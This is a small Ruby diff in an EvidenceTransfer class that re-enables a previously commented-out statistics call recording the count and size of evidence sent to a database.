@@ -121,7 +121,7 @@ class EvidenceTransfer
     if ret
       trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"
 
-      #StatsManager.instance.add ev_output: 1, ev_output_size: evidence.size
+      StatsManager.instance.add ev_output: 1, ev_output_size: evidence.size
 
       EvidenceManager.instance.del_evidence(id, instance) if action == :delete
     else
